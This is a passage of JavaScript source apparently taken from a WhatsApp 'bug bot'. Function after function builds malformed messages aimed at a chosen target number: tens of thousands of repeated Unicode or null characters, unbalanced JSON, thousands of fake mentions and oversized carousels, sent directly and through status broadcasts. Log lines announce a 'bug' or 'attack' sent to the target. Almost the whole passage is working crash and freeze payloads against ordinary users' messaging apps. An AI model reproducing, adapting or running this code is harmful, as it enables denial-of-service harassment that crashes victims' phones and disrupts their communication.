      url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
      fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
      fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
      mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
      mimetype: "image/webp",
      height: 9999,
      width: 9999,
      directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
      fileLength: 12260,
      mediaKeyTimestamp: "1743832131",
      isAnimated: false,
      stickerSentTs: "X",
      isAvatar: false,
      isAiSticker: false,
      isLottie: false,
      contextInfo: {
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from(
            { length: 1900 },
            () =>
              "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          ),
        ],
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      }
    }
  };

  await Abim.relayMessage("status@broadcast", msg, {
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  });

  console.log(chalk.red(`─────「 ⏤!InvisibleSticker To: ${target}!⏤ 」─────`))
}
async function ForceNewRapzz(target) {
    const client = this; 
    
    const message = {
        botInvokeMessage: {
            message: {
                newsletterAdminInviteMessage: {
                    newsletterJid: '666@newsletter',
                    newsletterName: "ꦾ".repeat(60000),
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAB4ASAMBIgACEQEDEQH/xAArAAACAwEAAAAAAAAAAAAAAAAEBQACAwEBAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhADEAAAABFJdjZe/Vg2UhejAE5NIYtFbEeJ1xoFTkCLj9KzWH//xAAoEAABAwMDAwMFAAAAAAAAAAABAAIDBBExITJBEBJRBRMUIiMicoH/2gAMAQEAAT8AozeOpd+K5UBBiIfsUoAd9OFBv/idkrtJaCrEFEnCpJxCXg4cFBHEXgv2kp9ENCMKujEZaAhfhDKqmt9uLs4CFuUSA09KcM+M178CRMnZKNHaBep7mqK1zfwhlRydp8hPbAQSLgoDpHrQP/ZRylmmtlVj7UbvI6go6oBf/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAgEBPwAv/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAwEBPwAv/9k=",
                    caption: "ꦾ".repeat(90000),
                    inviteExpiration: Date.now() + 0x99999999999abcdef,
                },
            },
        },
        nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000),
            buttons: [
                {
                    name: "mpm",
                    buttonParamsJson: "\u0000".repeat(808808)
                },
                {
                    name: "single_select",
                    buttonParamsJson: "{\"title\":\"" + "ྀ".repeat(77777) + "ྀ".repeat(77777) + "\",\"sections\":[{\"title\":\"" + "ྀ".repeat(77777) + "\",\"rows\":[]}]}"
                },
                {
                    name: "galaxy_message",
                    buttonParamsJson: JSON.stringify({ status: "1" })
                },
                {
                    name: "call_permission_request",
                    buttonParamsJson: "{".repeat(808808)
                }
            ]
        },
        nativeFlowInfo: {
            name: "galaxy_message",
            paramsJson: "\u0003".repeat(9999)
        },
        carouselMessage: {
            cards: Array.from({ length: 200 }, () => ({
                cardHeader: {
                    title: "\u0000".repeat(999),
                    subtitle: "𝐑𝐚𝐩𝐳𝐳𝐳𝐅𝐮𝐜𝐤𝐖𝐨𝐫𝐥𝐝𝐝 ( 𝐂𝐨𝐫𝐞𝟗𝟗𝟗 )",
                    thumbnail: Buffer.alloc(1024 * 32).fill(0)
                },
                cardContent: {
                    title: "\u0000",
                    description: "\n".repeat(500)
                },
                buttons: [
                    { name: "call_permission_request", buttonParamsJson: "\u0000" + Rapzfvckworld  },
                    { name: "mpm", buttonParamsJson: "{".repeat(1000) + Rapzfvckworld  },
                    { name: "single_select", buttonParamsJson: "" }
                ]
            }))
        },
        contextInfo: {
            remoteJid: target,
            participant: target,
            mentionedJid: mentionedList,
            stanzaId: client.generateMessageTag(),
            businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net"
            },
            expiration: 9741,
            ephemeralSettingTimestamp: 9741,
            entryPointConversionSource: "WhatsApp.com",
            entryPointConversionApp: "WhatsApp",
            entryPointConversionDelaySeconds: 9742,
            disappearingMode: {
                initiator: "INITIATED_BY_OTHER",
                trigger: "ACCOUNT_SETTING"
            },
            quotedMessage: {
                ephemeralMessage: {
                    message: {
                        viewOnceMessage: {
                            message: {
                                ephemeralSettingRequestMessage: {
                                    ephemeralDuration: 0
                                },
                                orderMessage: {
                                    itemCount: 99999999
                                }
                            }
                        }
                    }
                }
            }
        },
    };

    await Abim.sendMessage(target, message);

    await Abim.relayMessage(target, {
        interactiveMessage: {
            body: {
                text: 'ABIM HI ꦾ '
            },
            header: {
                hasMediaAttachment: true,
                jpegThumbnail:  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAB4ASAMBIgACEQEDEQH/xAArAAACAwEAAAAAAAAAAAAAAAAEBQACAwEBAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhADEAAAABFJdjZe/Vg2UhejAE5NIYtFbEeJ1xoFTkCLj9KzWH//xAAoEAABAwMDAwMFAAAAAAAAAAABAAIDBBExITJBEBJRBRMUIiMicoH/2gAMAQEAAT8AozeOpd+K5UBBiIfsUoAd9OFBv/idkrtJaCrEFEnCpJxCXg4cFBHEXgv2kp9ENCMKujEZaAhfhDKqmt9uLs4CFuUSA09KcM+M178CRMnZKNHaBep7mqK1zfwhlRydp8hPbAQSLgoDpHrQP/ZRylmmtlVj7UbvI6go6oBf/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAgEBPwAv/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAwEBPwAv/9k=",
                contextInfo: {
                    participant: target
                }
            },
            nativeFlowMessage: {
                buttons: [
                    {
                        name: "payment_method",
                        buttonParamsJson: "{}"
                    }
                ]
            }
        }
    }, {
        participant: { jid: target },
        additionalNodes: [
            {
                tag: 'biz',
                attrs: { native_flow_name: 'payment_method' }
            }
        ]
    });
}
async function mikirKidz(target) {
  try {
    let message = {
      interactiveMessage: {
        body: { text: "X" },
        nativeFlowMessage: {
          buttons: [
            {
              name: "payment_method",
              buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"\u0010".repeat(
                0x2710
              )},\"payment_timestamp\":null,\"share_payment_status\":true}`,
            },
          ],
          messageParamsJson: "{}",
        },
      },
    };

    for (let iterator = 0; iterator < 1; iterator++) {
      const msg = generateWAMessageFromContent(target, message, {});

      await Abim.relayMessage(target, msg.message, {
        additionalNodes: [
          { tag: "biz", attrs: { native_flow_name: "payment_method" } },
        ],
        messageId: msg.key.id,
        participant: { jid: target },
        userJid: target,
      });

      await Abim.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: { native_flow_name: "payment_method" },
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                    content: undefined,
                  },
                ],
              },
            ],
          },
        ],
      });

      await new Promise((resolve) => setTimeout(resolve, 500));
    }

    console.log("BUG GACOR TERKIRIM");
  } catch (err) {
    console.error(calik.red.bold(err));
  }
}
async function invCallzlwq(target) {
  await Abim.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "\u200B",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\n".repeat(1000000),
              version: 3
            }
          }
        }
      }
    },
    { participant: { jid: target } }
  );
}
async function XStromNewUi(target) {
  try {
   const msg = {
     viewOnceMessage: {
       message: {
         interactiveMessage: {
           contextInfo: {
             participant: target,
             mentionedJid: [
               "0@s.whatsapp.net",
                ...Array.from(
               { length: 1900 },
               () =>
             "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          ),
        ],
        remoteJid: "X",
        participant: "0@s.whatsapp.net",
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
           paymentInviteMessage: {
             serviceType: 3,
             expiryTimestamp: Date.now() + 1814400000
               },
             },
             externalAdReply: {
               title: "☀️",
               body: "🩸",
               mediaType: 1,
             renderLargerThumbnail: false,
             },
           },
           body: {
             text: "⌁⃰𝙓Hi ABIMཀ" +
              "ោ៝".repeat(25000) +
              "ꦾ".repeat(25000) +
              "@5".repeat(50000),
           },
           nativeFlowMessage: {
             messageParamJson: "{".repeat(25000),
           },
           stickerMessage: {
             url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
             fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
             fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
             mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
             mimetype: "image/webp",
             height: 9999,
             width: 9999,
             directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
             fileLength: 12260,
             mediaKeyTimestamp: "1743832131",
             isAnimated: false,
             stickerSentTs: "X",
             isAvatar: false,
             isAiSticker: false,
             isLottie: false,
           },
         },
       },
     },
   };
   
   await Abim.relayMessage(target, msg, {
     messageId: null,
     participant: { jid: target },
   });
   console.log(chalk.bold.blue(`Succes Sending Bug NewUi By Wolker To ${target}`));
 } catch (err) {
   console.log("GAGAL MENGIRIM BUG STICKER", err);
   throw err;
  }
}
async function NanCrashiPhone(target) {
Abim.relayMessage(
target,
{
  extendedTextMessage: {
    text: "❗❗ABIM IS HERE❗❗"+ "࣯ꦾ".repeat(90000),
    contextInfo: {
      fromMe: false,
      stanzaId: target,
      participant: target,
      quotedMessage: {
        conversation: "❗WOLKER❗" + "ꦾ".repeat(90000),
      },
      disappearingMode: {
        initiator: "CHANGED_IN_CHAT",
        trigger: "CHAT_SETTING",
      },
    },
    inviteLinkGroupTypeV2: "DEFAULT",
  },
},
{
  participant: {
    jid: target,
  },
},
{
  messageId: null,
}
);
}
async function InteractiveCrash(target) {
  try {
    const Msg = await generateWAMessageFromContent(
      target,
      {
        message: {
          interactiveMessage: {
            text: "Always Abim",
            format: "DEFAULT"
          },
          nativeFlowMessage: {
            name: "menu_option",
            paramsJson: "{{{".repeat(9999) + "\u0007\u0007".repeat(25555) + "".repeat(2555)
          },
          contextInfo: {
            stanzaId: "Laurine-BD32C2474B38",
            participant: target,
            annotations: [
              {
                polygonVertices: Array.from({ length: 10000 }, () => ({
                  x: Math.random() * 999999,
                  y: Math.random() * 999999
                })),
                newsletter: {
                  newsletterJid: "120363301416835342@newsletter",
                  newsletterName: "Abim Kill You !!!",
                  contentType: "UPDATE",
                  accessibilityText: "\u0000".repeat(10000)
                }
              }
            ],
            quotedMessage: {
              buttonMessage: {
                text: "ꦾ".repeat(25555),
                imageMessage: {
                  url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQN-fek5BOzwGwVNT4XLvpKbOIreTVEAYw8T6P4zxhZZWR0mcI6Mtkvr0wPAw8dRRfBUshZEfRtyuPzDlvHu_tKklNofdgOHkgQy3k2_4w?ccb=9-4&oh=01_Q5Aa2AERSLJi1hc8wlnqazVb2gIWRJgAhnioW7jEj-1yYDLXGA&oe=68A8518F&_nc_sid=e6ed6c&mms3=true",
                  mimetype: "image/jpeg",
                  caption: "\u0000\u0000".repeat(20000),
                  fileSha256: "lkP8hsY4ex+lzJw1ylVMCT/Ofl2Ouk7vTzjwKliA5fI=",
                  fileLength: 73247,
                  height: 736,
                  width: 736,
                  mediaKey: "X+ED0aJJfYyCud4vJNgwUUdMQy1zMJ7hHAsFUIUgt1w=",
                  fileEncSha256: "5xn7hRt0IR3v3pc54sbg8bemzYbE3FTHoK4rbWWE4Jk=",
                  directPath: "/o1/v/t24/f2/m238/AQN-fek5BOzwGwVNT4XLvpKbOIreTVEAYw8T6P4zxhZZWR0mcI6Mtkvr0wPAw8dRRfBUshZEfRtyuPzDlvHu_tKklNofdgOHkgQy3k2_4w?ccb=9-4&oh=01_Q5Aa2AERSLJi1hc8wlnqazVb2gIWRJgAhnioW7jEj-1yYDLXGA&oe=68A8518F&_nc_sid=e6ed6c",
                  jpegThumbnail: null
                },
                mentionedJid: [
                  target,
                  "0@s.whatsapp.net",
                  ...Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
                ]
              }
            }
          }
        }
      }
    );

    await Abim.relayMessage(target, Msg.message, {
      messageId: undefined
    });

    await delay(3000);

    await Abim.sendMessage(target, {
      delete: {
        remoteJid: target,
        fromMe: true,
        id: Msg.key?.id,
        participant: target
      }
    });

  } catch (err) {
    console.error('❌ Gagal menjalankan InteractiveCrash:', err);
  }
}
async function delayspamsyg(target) {
  let ameliamsg = {
    viewOnceMessage: {
      message: {
        requestPhoneNumberMessage: {
          contact: {
            displayName: "ꦾ".repeat(5000),
            vcard:
              "BEGIN:VCARD\nFN:" +
              "ꦾ".repeat(10000) +
              "\nEND:VCARD",
          },
          contextInfo: {
            stanzaId: "BUG-" + Date.now(),
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 500 },
                () =>
                  "1" +
                  Math.floor(Math.random() * 9999999) +
                  "@s.whatsapp.net"
              ),
            ],
            quotedMessage: {
              stickerMessage: {
                mimetype: "image/webp",
                isAnimated: true,
                fileSha256: Buffer.alloc(64),
                mediaKey: Buffer.alloc(32),
                height: 99999,
                width: 99999,
                directPath: "/invalidpath",
                mediaKeyTimestamp: 99999999,
              },
            },
          },
        },
      },
    },
  };

  await Abim.relayMessage(target, ameliamsg, {
    participant: { jid: target },
    messageId: null,
  });
}
async function CrashBetajj(target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { 
            text: '' 
          },
          footer: { 
            text: ' APA KABAR BOS' 
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: 'BOT',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQMcsHgJduBlnnAdYUKKvZR6K68unf7-QyUGxiAbmersAyOKWrWQImD-HxZQ4Edsbe4z4Vf69d1cl2NNH94TEeYQxUJKVKAHayLoQONY-w?ccb=9-4&oh=01_Q5Aa1gFIJSOQsH5-cmce_ee4C_CiwYWMbABLd7WBq96f8N-BbA&oe=686B2C5A&_nc_sid=e6ed6c&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "DB/+n19HzggqZQiywcEYAlHH50RbEI0pwXrxD5kkLlA=",
                    fileLength: "178006",
                    height: 1,
                    width: 1,
                    mediaKey: "k6jdnVseHd/eIGBEEkBdtLqwr5L1I7X+jH5WStYQ1tY=",
                    fileEncSha256: "7cEoBgfRxb44DFjw8j+Zjy8GniEqoXWTw1DD98V4eVQ=",
                    directPath: "/o1/v/t24/f2/m234/AQMcsHgJduBlnnAdYUKKvZR6K68unf7-QyUGxiAbmersAyOKWrWQImD-HxZQ4Edsbe4z4Vf69d1cl2NNH94TEeYQxUJKVKAHayLoQONY-w?ccb=9-4&oh=01_Q5Aa1gFIJSOQsH5-cmce_ee4C_CiwYWMbABLd7WBq96f8N-BbA&oe=686B2C5A&_nc_sid=e6ed6c",
                    mediaKeyTimestamp: "1749267080",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAvAAADAQEBAQAAAAAAAAAAAAAAAgMEAQYFAQEBAQEAAAAAAAAAAAAAAAABAAID/9oADAMBAAIQAxAAAADzz0pLiXNIteDJdW5x50YZ9EmN2e9ayc38jFx8cwKFau5d5urP3XGXNHIxR35TcjMHam/5tnhvSHTux2VaGzRuczhrCMFKBDIFN0DSAOf/xAAlEAACAQQCAgIDAQEAAAAAAAABAgADERIhBDETQRQiQlGRYbH/2gAIAQEAAT8AAvMYOKHQMPYnwWGy4nwTjfISlxVdX3sGfCNgQ0q8VqYBuCIREp39woR+M8jrit9Azz0jlo7nmphdXicimoIUdjc4xJX7Eytx6a0i1/UMXuB7e54gwBvDwwGAL9wcS4YBujPhfprxSaGtESryXraJhEVY6+wJxr+AkLfccvUCaXRjpiUAYAHZi1CCWxBPQPqctgyKQtoi+yNwjRiPTCFSPtAJQJSkw/EmKhyvnGcoSDY76lUs9NAoxEqlXCix1LWlR6ZQBRsdxO4i/wDJTRioWYtlphf1ClwQT95SCUkPlOyJVAIWxFoy2BtG7Mp2yEFTF1W2iJVqMuOMavZg1j1PMQQxJJJ6lSoXJKk7lO5JJ2I707ECMNmI24KhM8thcxGR2s39mND9mMyq1l/s8utQts/7G9wQNC0zI9zytiBeZk9mBoWjNP/EABkRAAIDAQAAAAAAAAAAAAAAAAERABAgIf/aAAgBAgEBPwCd0rAWAKZjMG//xAAfEQEAAgICAgMAAAAAAAAAAAABAAIDERASEyExQUL/2gAIAQMBAT8AgDGs1w1113LPV1G9n5mvVX7ZajMl+xWPA6ay+TbDbqGKv6fc8eOXo1jBSKxssLOuP//Z",
                    scansSidecar: "gEedIqFUVuURFyxuDXiES/ApmRF2SvVhKGpUjvrdz/JxAEcwvuFtiA==",
                    scanLengths: [19972, 38699, 68065, 51270]
                  },
                  hasMediaAttachment: true, 
                },
                body: { 
                  text: "ABIM IS HERE BRO?" + "ꦽ".repeat(10000)
                },
                footer: {
                  text: "https://VampApiFC.xp"
                },
                nativeFlowMessage: {
                  messageParamsJson: "{".repeat(10000) 
                }
              }
            ]
          },
          contextInfo: {
            mentionJid: ['13135550202@s.whatsapp.net'],
            participant: "0@s.whatsapp.net",             
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: "{ Shut Up Bitch }",
                      version: 3
                    }
                  }
                }
              }
            },
            remoteJid: "@s.whatsapp.net"
          }
        }
      }
    }
  }, {});

  await Abim.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
  console.log(chalk.red(" Success Sending Bug"));
}
async function frezeui(target) {
  await Abim.relayMessage(target, {
    viewOnceMessage: {
      message: {
        buttonsMessage: {
          text: "‼️⃟ ༚ С𝛆ну‌‌‌‌ 𝔇𝔢𝔞𝔱𝝒 ⃨𝙲᪻𝒐‌‌‌‌𝖗𝚎ᜆ‌‌‌‌⋆>",
          contentText: "‼️⃟ ༚ С𝛆ну‌‌‌‌ 𝔇𝔢𝔞𝔱𝝒 ⃨𝙲᪻𝒐‌‌‌‌𝖗𝚎ᜆ‌‌‌‌⋆>" + "ꦽ".repeat(4000),
          contextInfo: {
            forwardingScore: 6,
            isForwarded: true,
              urlTrackingMap: {
                urlTrackingMapElements: [
                  {
                    originalUrl: "https://t.me/vibracoess",
                    unconsentedUsersUrl: "https://t.me/vibracoess",
                    consentedUsersUrl: "https://t.me/vibracoess",
                    cardIndex: 1,
                  },
                  {
                    originalUrl: "https://t.me/vibracoess",
                    unconsentedUsersUrl: "https://t.me/vibracoess",
                    consentedUsersUrl: "https://t.me/vibracoess",
                    cardIndex: 2,
                  },
                ],
              },            
            quotedMessage: {
              interactiveResponseMessage: {
                body: {
                  text: "🦠 WOY ANJG",
                  format: "EXTENSIONS_1"
                },
                nativeFlowResponseMessage: {
                  name: "address_message",
                  paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"xrl\",\"tower_number\":\"relly\",\"city\":\"markzuckerberg\",\"name\":\"fucker\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"X${"\u0000".repeat(7000)}\"}}`,
                  version: 3
                }
              }
            }
          },
          headerType: 1
        }
      }
    }
  }, {});
}
async function ForceInfinitybak(target) {
  try {
    let message = {
      interactiveMessage: {
        body: { text: "ASSALAMUALAIKUM" },
        nativeFlowMessage: {
          buttons: [
            {
              name: "payment_method",
              buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"\u0010".repeat(
                0x2710
              )},\"payment_timestamp\":null,\"share_payment_status\":true}`,
            },
          ],
          messageParamsJson: "{}",
        },
      },
    };

    const msg = generateWAMessageFromContent(target, message, {});

    await Abim.relayMessage(target, msg.message, {
      additionalNodes: [
        { tag: "biz", attrs: { native_flow_name: "payment_method" } },
      ],
      messageId: msg.key.id,
      participant: { jid: target },
      userJid: target,
    });

    await Abim.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: { native_flow_name: "payment_method" },
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined,
                },
              ],
            },
          ],
        },
      ],
    });

    console.log("🧭 𝙃𝙖𝙧𝙙 𝙨𝙪𝙘𝙘𝙚𝙨 𝙩𝙤 𝙩𝙖𝙧𝙜𝙚𝙩");
  } catch (err) {
    console.error(calik.red.bold(err));
  }
}
async function SubsMentCarouselDelay(target) {
  return new Promise(async (resolve) => {
    try {
      const uniqueId = `msg_${Date.now()}_${Math.random().toString(36).substr(2, 999999)}`;
      const mentionedJids = [
        "0@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () => // max value 45000
          `1${Math.floor(Math.random() * 50000000)}@s.whatsapp.net`
        )
      ];

      const interactiveContent = generateWAMessageFromContent(target, {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: {
                text: ""
              },
              contextInfo: {
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                mentionedJid: mentionedJids,
                isForwarded: true,
                forwardingScore: 999,
                supportPayload: JSON.stringify({
                  version: 2,
                  is_ai_message: true,
                  should_show_system_message: true,
                  ticket_id: ""
                }),
                quotedMessage: {
                  conversation: "сем".repeat(100000)
                },
              }
            }
          }
        }
      }, { viewOnce: true });

      let hard = 10;
      for (let i = 0; i < hard; i++) {
        let push = [];
        let buttt = [];

        for (let j = 0; j < 5; j++) {
          buttt.push({
            name: "action",
            buttonParamsJson: "&=",
          });
        }

        for (let k = 0; k < 1000; k++) {
          push.push({
            body: {
              text: ""
            },
            footer: {
              text: ""
            },
            header: {
              title: "",
              hasMediaAttachment: true,
              imageMessage: {
                url: null,
                mimetype: "image/jpeg",
                fileSha256: "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
                fileLength: "10000000000000000",
                height: 0,
                width: 0,
                mediaKey: "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
                fileEncSha256: "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
                directPath: "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1721344123",
                jjpegThumbnail : null,
                scansSidecar: "igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==",
                scanLengths: [5012, 5012, 5012, 5012],
                midQualityFileSha256: "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro="
              }
            },
            nativeFlowMessage: {
              buttons: buttt
            }
          });
        }

        const carousel = generateWAMessageFromContent(target, {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadata: { encryptionType: "SHA-256" },
                deviceListMetadataVersion: 2
              },
              interactiveMessage: {
                body: {
                  text: "woy ada abim"
                },
                footer: {
                  text: ""
                },
                header: {
                  hasMediaAttachment: false
                },
                carouselMessage: {
                  cards: push
                },
              }
            }
          }
        }, { senderKeyHash: "{ E5:10 }" });

        await Abim.relayMessage("status@broadcast", carousel.message, {
          messageId: uniqueId,
          format: "TypeScript",
          statusJidList: [target],
          additionalNodes: [
            {
              tag: "meta",
              attrs: {},
              content: [
                {
                  tag: "mentioned_users",
                  attrs: {},
                  content: [
                    {
                      tag: "to",
                      attrs: { jid: target },
                      content: undefined
                    }
                  ]
                }
              ]
            }
          ]
        });

        await new Promise(resolve => setTimeout(resolve, 1000));
      }

      setTimeout(() => resolve(), 2000);
    } catch (err) {
      console.error("xxxx:", err);
      resolve();
    }
  });
}
async function OtaxvsAbim(target) {

  let biji2 = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: " ¿Otax Here¿ ",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\x10".repeat(1045000),
              version: 3,
            },
            entryPointConversionSource: "call_permission_request",
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background:
        "#" +
        Math.floor(Math.random() * 16777215)
          .toString(16)
          .padStart(6, "99999999"),
    }
  );
 
  const mediaData = [
    {
      ID: "68917910",
      uri: "t62.43144-24/10000000_2203140470115547_947412155165083119_n.enc?ccb=11-4&oh",
      buffer: "11-4&oh=01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe",
      sid: "5e03e0",
      SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
      ENCSHA256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
      mkey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
    },
    {
      ID: "68884987",
      uri: "t62.43144-24/10000000_1648989633156952_6928904571153366702_n.enc?ccb=11-4&oh",
      buffer: "B01_Q5Aa1wH1Czc4Vs-HWTWs_i_qwatthPXFNmvjvHEYeFx5Qvj34g&oe",
      sid: "5e03e0",
      SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
      ENCSHA256: "25fgJU2dia2Hhmtv1orOO+9KPyUTlBNgIEnN9Aa3rOQ=",
      mkey: "lAMruqUomyoX4O5MXLgZ6P8T523qfx+l0JsMpBGKyJc=",
    },
  ]

  let sequentialIndex = 0
  console.log(chalk.red(`🔥 𝘴𝘦𝘥𝘢𝘯𝘨 𝘮𝘦𝘯𝘨𝘪𝘳𝘪𝘮 𝘢𝘵𝘵𝘢𝘤𝘬 𝘬𝘦 ${target}`))

  const selectedMedia = mediaData[sequentialIndex]
  sequentialIndex = (sequentialIndex + 1) % mediaData.length
  const { ID, uri, buffer, sid, SHA256, ENCSHA256, mkey } = selectedMedia

  const contextInfo = {
    participant: target,
    mentionedJid: [
      target,
      ...Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
    ],
  }

  const stickerMsg = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
